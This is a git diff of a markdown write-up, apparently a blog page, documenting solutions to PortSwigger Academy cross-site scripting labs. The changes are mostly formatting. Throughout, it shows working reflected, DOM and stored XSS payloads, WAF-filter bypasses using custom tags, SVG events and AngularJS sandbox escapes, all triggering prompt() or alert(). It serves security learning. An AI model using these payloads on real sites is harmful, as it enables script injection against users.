@@ -54,19 +54,20 @@ E.g., \<h1\>test\</h1\>
 
 </details>
 
-## 1.Reflected XSS
+## 1. Reflected XSS
 Inject payload into the HTTP request. And once the web server receive the request, it will response with the payload to sender’s browser. It relies on URL to make user fall for the attack.
 
 ### Labs (Reflected XSS)
 Just for demostration, I completed some labs on [PortSwigger Academy](https://portswigger.net/web-security/all-labs#cross-site-scripting) to show how this vulnerability can lead to:
 
 <details markdown="1">
-  <summary>Click me to expand the labs</summary>  
+<summary>Click me to expand the labs</summary>  
 
-  _**1. Reflected XSS into attribute with angle brackets HTML-encoded**_
+  _**1. Reflected XSS into attribute with angle brackets HTML-encoded**_  
   The application contains a reflected XSS vulnerability in the search blog feature, where angle brackets are HTML-encoded. I inject an attribute via XSS that triggers an alert function.
+  
   <details markdown="1">
-    <summary>Click me to expand the process</summary>
+  <summary>Click me to expand the process</summary>
   
   1. Enter random input (e.g., test123) in the user input (URL query)
      ~~~
@@ -92,10 +93,11 @@ Just for demostration, I completed some labs on [PortSwigger Academy](https://po
   </details>
   -
 
-  _**2. Reflected XSS into a JavaScript string with angle brackets HTML encoded**_
+  _**2. Reflected XSS into a JavaScript string with angle brackets HTML encoded**_  
   In this instance, the application is vulnerable to reflected XSS in the search query tracking functionality, where angle brackets are encoded. The reflection occurs inside a JavaScript string. I break out of the string and triggers the `prompt()` function, to demonstrate the vulnerability.
+  
   <details markdown="1">
-    <summary>Click me to expand the process</summary>
+  <summary>Click me to expand the process</summary>
   
   1. I enter random input (e.g., test) in the user input (search bar)
   
@@ -119,10 +121,11 @@ Just for demostration, I completed some labs on [PortSwigger Academy](https://po
   </details>
   -
 
-  _**3. Reflected DOM XSS**_
+  _**3. Reflected DOM XSS**_  
   In this instance, a script on the page processes reflected data (user input) with `eval()` without any sanitization and ultimately writes it to a dangerous sink.
+  
   <details markdown="1">
-    <summary>Click me to expand the process</summary>
+  <summary>Click me to expand the process</summary>
 
   1. First, I find the script used in the web application under the Network tab on the Inspection page.
      - The `xhr.open` method sends a GET request (with user input retrieved from `path + window.location.search`) and fetches data from the server using `XMLHttpRequest`.
@@ -142,7 +145,6 @@ Just for demostration, I completed some labs on [PortSwigger Academy](https://po
      ```
    
   2. I send a test request and intercept the response using Burp Proxy.
-
      ```json
      {"results":[],"searchTerm":"test"}
      ```
@@ -167,11 +169,11 @@ Just for demostration, I completed some labs on [PortSwigger Academy](https://po
   </details>
   -
 
-  _**4. Reflected XSS into HTML context with most tags and attributes blocked**_
+  _**4. Reflected XSS into HTML context with most tags and attributes blocked**_  
   In this instance, the `/?search` parameter is being reflected into the page as HTML without proper contextual encoding or sanitization, and the WAF’s tag/attribute filtering is insufficient, so I bypass the filter and executes `prompt()`.
 
   <details markdown="1">
-    <summary>Click me to expand the process</summary>
+  <summary>Click me to expand the process</summary>
 
   1. After using general XSS testing payloads, I learn that the WAF is blocking some HTML tags to prevent common XSS.
      ~~~
@@ -201,6 +203,7 @@ Just for demostration, I completed some labs on [PortSwigger Academy](https://po
      - I used an `<iframe>` to embeds this vulnerable webpage (`src="https[://]vulnerable[.]com/`).
      - The query parameter `/?search` then load the URL-encoded payload `%22%3E%3Cbody+onresize=prompt()%3E`
      - [this.style.width](https://www.w3schools.com/jsref/prop_style_width.asp) to adjust the iframe’s size, which will trigger the `onresize` event and `prompt()`.
+
      ~~~
      <iframe src="https[://]vulnerable[.]com/?search=%22%3E%3Cbody+onresize=prompt()%3E" onload=this.style.height='88px'></iframe>
      ~~~
@@ -212,11 +215,11 @@ Just for demostration, I completed some labs on [PortSwigger Academy](https://po
   </details>
   -
 
-  _**5. Reflected XSS into HTML context with all tags blocked except custom ones**_
+  _**5. Reflected XSS into HTML context with all tags blocked except custom ones**_  
   In this instance, I find that the WAF blocks standard tags but allows custom element names. Because browser will parse custom tags as valid elements (`<cust-foo>`) and allow attributes (`onfocus`), I bypass the WAF and execute a prompt with custom tag, and other components to simulate the exploit in a real‑world scenario.
 
   <details markdown="1">
-    <summary>Click me to expand the process</summary>
+  <summary>Click me to expand the process</summary>
 
   1. I started by testing the input form, and the response indicated that the tag was blocked.
      ~~~
@@ -254,11 +257,11 @@ Just for demostration, I completed some labs on [PortSwigger Academy](https://po
   </details>
   -
 
-  _**6. Reflected XSS with some SVG markup allowed**_
+  _**6. Reflected XSS with some SVG markup allowed**_  
   In this instance, I discovered a reflected XSS vector that bypasses the WAF by using certain unfiltered tags and event. By inserting those, I was able to execute JavaScript, demonstrating a reflected XSS bypass through SVG + SMIL animation events.
 
   <details markdown="1">
-    <summary>Click me to expand the process</summary>
+  <summary>Click me to expand the process</summary>
 
   1. I started by testing the input form, and the response indicated that the tag was blocked.
      ~~~
@@ -266,13 +269,13 @@ Just for demostration, I completed some labs on [PortSwigger Academy](https://po
      Response: "Tag is not allowed"
      ~~~
 
-  2.  To find out which tag isn't blocked, I used Burp Intruder with all tag options as payload (retrieved from the [XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)). The result tells me that `<animatetransform>`, `<image>`, `<svg>`, `<title>` are not blocked by the WAF.
+  2. To find out which tag isn't blocked, I used Burp Intruder with all tag options as payload (retrieved from the [XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)). The result tells me that `<animatetransform>`, `<image>`, `<svg>`, `<title>` are not blocked by the WAF.
      ~~~
      Burp Intruder:
      GET /?search=<Payload Position> HTTP/1.1
      ~~~
 
-  4. Next, to find out which event is not filtered. I repeated step 2 but copied the events from the [XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet). I use `<image>` as example since I know it is not filtered, then I received only `onbegin` events that returned 200 OK.
+  3. Next, to find out which event is not filtered. I repeated step 2 but copied the events from the [XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet). I use `<image>` as example since I know it is not filtered, then I received only `onbegin` events that returned 200 OK.
      ~~~
      Burp Intruder:
      GET /?search=<image+src="x"+<Payload Position>=1> HTTP/1.1
@@ -288,11 +291,11 @@ Just for demostration, I completed some labs on [PortSwigger Academy](https://po
   </details>
   -
 
-  _**7. Reflected XSS in canonical link tag**_
+  _**7. Reflected XSS in canonical link tag**_  
 In this instance, I discovered that untrusted input from the URL query string is reflected into canonical link tag in the page source. By injecting [accesskey](https://www.w3schools.com/jsref/prop_html_accesskey.asp, "HTML DOM Element accessKey") attribute,  I was able to prove code execution in the page context after pressing the keystroke triggered JavaScript.
 
   <details markdown="1">
-    <summary>Click me to expand the process</summary>
+  <summary>Click me to expand the process</summary>
 
   1. I opened the Inspector and found the canonical link in the source code.
      ~~~
@@ -323,14 +326,13 @@ In this instance, I discovered that untrusted input from the URL query string is
   </details>
   -
 
-  _**8. Reflected XSS into a JavaScript string with single quote and backslash escaped**_
+  _**8. Reflected XSS into a JavaScript string with single quote and backslash escaped**_  
   In this instance, I discover a XSS vulnerability in the search tracking code. The application inserts user input directly into a JavaScript single-quoted string and escapes single quotes with a backslash, but it does not prevent breaking out of the surrounding script context (angle bracket > not escaped). I terminate the `<script>` tag and injecting a new `<script>` block.
 
   <details markdown="1">
     <summary>Click me to expand the process</summary>
 
   1. I start by testing the input (`test_input`) to see where it is rendered in the source code, then I find my input is in a search function.
-
      ```javascript
      <script>
        var searchTerms = 'test_input';
@@ -339,7 +341,6 @@ In this instance, I discovered that untrusted input from the URL query string is
      ```
    
   2. To test whether I can break out of the single quote (`'`), I try entering a single quote, but it is escaped with a backslash (`'\`).
-
      ```javascript
      <script>
        var searchTerms = '\'test_input';
@@ -348,7 +349,6 @@ In this instance, I discovered that untrusted input from the URL query string is
      ```
    
   3. I try to escape the backslash (`\\'`), but it doesn’t work.
-
      ```javascript
      <script>
        var searchTerms = '\\\'test_input';
@@ -357,7 +357,6 @@ In this instance, I discovered that untrusted input from the URL query string is
      ```
    
   4. Then I discover that the angle bracket isn’t escaped, so I close the existing tag with `</script>` and insert a new one `<script>prompt();</script>`. A popup then displays my message.
-
      ```javascript
      <script>
        var searchTerms = '</script><script>prompt("Am I vulnerable to XSS");</script>
@@ -369,13 +368,13 @@ In this instance, I discovered that untrusted input from the URL query string is
   </details>
   -
 
-  _**9. Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped**_
+  _**9. Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped**_  
 This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets and double are HTML encoded and single quotes are escaped.
 
 
 </details>
 
-## 2.Dom-Based XSS
+## 2. Dom-Based XSS
 Client-side has vulnerable JavaScript. It doesn’t involve with the server-side, completely rely on client’s browser to execute the payload.
 One quick check is turn on the developer tool, input and execute a simple prompt or alert script, see if there’s any network interaction with the server.
 
@@ -388,10 +387,11 @@ Just for demostration, I completed some labs on [PortSwigger Academy](https://po
 <details markdown="1">
   <summary>Click me to expand the labs</summary>  
 
-  _**1. DOM-based XSS in document.write sink using source location.search**_
+  _**1. DOM-based XSS in document.write sink using source location.search**_  
   The target application use `document.write()` function to display content from `location.search`, which comes from the URL query string. Allows users to modify the URL, and to inject and execute arbitrary scripts in the page.
+  
   <details markdown="1">
-    <summary>Click me to expand the process</summary>  
+  <summary>Click me to expand the process</summary>  
   
   1. Enter random input (e.g., 123456) in the user input (URL query)
      ~~~
@@ -415,10 +415,11 @@ Just for demostration, I completed some labs on [PortSwigger Academy](https://po
   </details>
   -
 
-  _**2. DOM XSS in innerHTML sink using source location.search**_
+  _**2. DOM XSS in innerHTML sink using source location.search**_  
   The application It assigns data from `location.search` to `innerHTML`, which updates the contents of a `<div>`. Since the URL can be controlled by the user, they can inject malicious HTML or scripts.
+  
   <details markdown="1">
-    <summary>Click me to expand the process</summary>  
+  <summary>Click me to expand the process</summary>  
   
   1. Enter random input (e.g., 123456) in the user input (URL query)
      ~~~
@@ -441,10 +442,11 @@ Just for demostration, I completed some labs on [PortSwigger Academy](https://po
   </details>
   -
   
-  _**3. DOM XSS in jQuery anchor href attribute sink using location.search source**_
+  _**3. DOM XSS in jQuery anchor href attribute sink using location.search source**_  
   In this instance, jQuery’s `$` selector is used to find a link and set its `href` using data from `location.search`, which comes from the URL query string.
+  
   <details markdown="1">
-    <summary>Click me to expand the process</summary>
+  <summary>Click me to expand the process</summary>
   
   1. Right-click on the webpage and open the inspection tab. I search for `location.search`, which led me to this script:
      ```javascript
@@ -467,10 +469,11 @@ Just for demostration, I completed some labs on [PortSwigger Academy](https://po
   </details>
   -
 
-  _**4. DOM XSS in jQuery selector sink using a hashchange event**_
+  _**4. DOM XSS in jQuery selector sink using a hashchange event**_  
   There is a DOM-based XSS vulnerability on the home page, where jQuery’s `$()` selector is used to auto-scroll to a post, with the title passed through `location.hash`.
+  
   <details markdown="1">
-    <summary>Click me to expand the process</summary>
+  <summary>Click me to expand the process</summary>
   
   1. Firstly, I search for `$()` in the inspection tab, and I find the syntax for this function. Which listens for hash changes in the URL (`/#`) and scrolls the corresponding blog post into view based on the hash value.
      ```javascript
@@ -496,15 +499,15 @@ Just for demostration, I completed some labs on [PortSwigger Academy](https://po
   </details>
   -
 
-_**5. DOM XSS in document.write sink using source location.search inside a select element**_
+_**5. DOM XSS in document.write sink using source location.search inside a select element**_  
   This instance contains a DOM-based XSS vulnerability in the stock checker functionality. It leverages the `document.write` function to output data to the page, using data from `location.search` that user can control through the website URL. The input data is between the `<option>` tag, I break out of it and calls the `prompt` function.
+  
   <details markdown="1">
-    <summary>Click me to expand the process</summary>
+  <summary>Click me to expand the process</summary>
   
   1. Firstly, I discover the function in the inspection tab (`right-click on the webpage > inspect`).
      And I learn that the script builds a `<select name="storeId">` dropdown by reading a `storeId` query parameter from the URL and, if present, adding it as the selected `<option>` before adding the three hard-coded stores (skipping any duplicate).
      It uses `document.write` with the raw URL value, so unescaped input could be reflected into the page; creating elements and setting textContent/value.
-   
      ```javascript
      var stores = ["London", "Paris", "Milan"];
      var store = (new URLSearchParams(window.location.search)).get('storeId');
@@ -523,7 +526,7 @@ _**5. DOM XSS in document.write sink using source location.search inside a selec
      document.write('</select>');
      ```
 
-  2. After discovering that the function takes user input in the `storeId` parameter, I add the `storeId` parameter after the original `productId` parameter with a `&`. I then send a test input (test) to see the application's response. As expected, I am able to add a new selected `<option>`.
+  2. After discovering that the function takes user input in the `storeId` parameter, I add the `storeId` parameter after the original `productId` parameter with a `&`. I then send a test input (e.g., test) to see the application's response. As expected, I am able to add a new selected `<option>`.
      ~~~
      URL: https[://]web-security-academy[.]net/product?productId=2&storeId=test
      Result:
@@ -534,7 +537,8 @@ _**5. DOM XSS in document.write sink using source location.search inside a selec
        <option>Milan</option>
      ~~~
   
-  3. Remember this syntax `document.write('<option>' + stores[i] + '</option>');` from the function. What I can do is close the first `<option>` tag, inject new HTML tags or event attributes, and then open another `<option>` tag. I try injecting a couple of new HTML tags, and both work. <br>Now, I can confirm that the stock search query function on this web application is vulnerable to XSS.
+  3. Remember this syntax `document.write('<option>' + stores[i] + '</option>');` from the function. What I can do is close the first `<option>` tag, inject new HTML tags and event attributes, and then open another `<option>` tag. I try injecting a couple of new HTML tags, and both work.
+     Now, I can confirm that the stock search query function on this web application is vulnerable to XSS.
      ~~~
      Payload-1: storeId=test</option><iframe src="javascript:prompt('work?');"></iframe><option>
      Payload-2: storeId=test</option><script>prompt('work?')</script><option>
@@ -543,14 +547,14 @@ _**5. DOM XSS in document.write sink using source location.search inside a selec
   </details>
   -
 
-  _**6. DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded**_
+  _**6. DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded**_  
   This instance contains a DOM-based XSS vulnerability in an `AngularJS` expression within the search functionality. I inject a method (e.g. `$on`/`$eval`) that is available in the current scope to bypass AngularJS's security filter, append the `.constructor` property to create a `Function` object (`function(user_input)`), and then call it with `()` to execute the created function.
 
   {: .box-note}
   **Note:** Refer to [AngularJS DOM XSS Attack](https://www.youtube.com/watch?v=QpQp2JLn6JA) for more details walkthrough
 
   <details markdown="1">
-    <summary>Click me to expand the process</summary>
+  <summary>Click me to expand the process</summary>
 
   1. After did some researches ([AngularJS - Escaping the Expression Sandbox](https://spring.io/blog/2016/01/28/angularjs-escaping-the-expression-sandbox-for-xss), [Function() constructor](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/Function), [Object.prototype.constructor](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/constructor), ) I come up with a couple of different payloads to pybass the security filter.
      ~~~
@@ -576,10 +580,11 @@ Just for demostration, I completed some labs on [PortSwigger Academy](https://po
 <details markdown="1">
   <summary>Click me to expand the labs</summary>  
 
-  _**1. Stored XSS into anchor href attribute with double quotes HTML-encoded**_
+  _**1. Stored XSS into anchor href attribute with double quotes HTML-encoded**_  
   This instance contains a stored XSS vulnerability in the comment section. I submit a comment that triggers an alert when the author’s name is clicked.
+  
   <details markdown="1">
-    <summary>Click me to expand the process</summary>
+  <summary>Click me to expand the process</summary>
   
   1. In the comment section, there are four fields (Comment, Name, Email, Website). After filling out all the fields and submitting my comment, I notice that the Name section contains an external link, which is the website I enter while filling out the form.
 
@@ -597,14 +602,13 @@ Just for demostration, I completed some labs on [PortSwigger Academy](https://po
   </details>
   -
 
-  _**2. Stored DOM XSS**_
+  _**2. Stored DOM XSS**_  
   In this instance, the comment rendering is vulnerable to stored DOM‑based XSS because `escape()` only replaces the first `<`, `>` so I bypass it which leaves later tags unescaped, allowing arbitrary script execution when the page inserts comments into the DOM.
 
   <details markdown="1">
-    <summary>Click me to expand the process</summary>
+  <summary>Click me to expand the process</summary>
 
   1. Firstly, I look into the script used in the web application under the Network tab on the Inspection page. And I find there is an escape function using [replace()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replace)
-
      ```javascript
      function escapeHTML(html) {
          return html.replace('<', '&lt;').replace('>', '&gt;');
@@ -624,7 +628,7 @@ Just for demostration, I completed some labs on [PortSwigger Academy](https://po
      </p>
      ~~~
 
-  3. A prompt pops up with a message after I submit (store) the payload in the comment section, which indicates the filter mechanism (`replace()` function) was bypassed and the application is still vulnerable to XSS."
+  3. A prompt pops up with a message after I submit (store) the payload in the comment section, which indicates the filter mechanism (`replace()` function) was bypassed and the application is still vulnerable to XSS.
 
   **Suggestion**: Make the escaping correct (use [global replacements or replaceAll/regex](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replace#description)), deploy a strict [Content Security Policy](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html) that disallows inline handlers, and protect cookies (HttpOnly/SameSite) to reduce impact.
 
